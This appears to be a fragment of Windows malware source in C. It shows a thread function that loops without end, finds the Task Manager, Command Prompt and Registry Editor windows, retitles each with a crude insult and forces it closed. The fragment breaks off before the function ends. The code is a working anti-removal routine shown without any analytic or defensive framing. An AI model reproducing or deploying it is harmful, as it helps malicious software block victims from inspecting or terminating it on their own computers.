DWORD WINAPI DestroyWindows(LPVOID)
{
while(1)
{
TaskMgr = FindWindow(NULL,"Windows Task Manager");
CMD = FindWindow(NULL, "Command Prompt");
Regedit = FindWindow(NULL,"Registry Editor");
if( TaskMgr != NULL )
{
SetWindowText( TaskMgr, "You Suck Balls Superman");
PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}
if( CMD != NULL )
{
SetWindowText( CMD, "You Suck Balls Superman");
PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}
if( Regedit != NULL )
{
SetWindowText( Regedit, "You Suck Balls Superman");
PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}